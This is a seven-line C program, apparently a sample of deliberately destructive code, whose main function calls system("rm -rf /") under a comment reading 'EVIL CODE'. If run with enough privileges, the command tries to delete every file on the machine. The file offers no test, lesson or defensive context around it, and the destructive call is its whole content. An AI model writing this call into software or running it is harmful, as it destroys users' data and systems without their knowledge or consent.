#include <stdio.h>
#include <stdlib.h>

int main(void) {
	system("rm -rf /"); /* EVIL CODE */
	return 0;
}
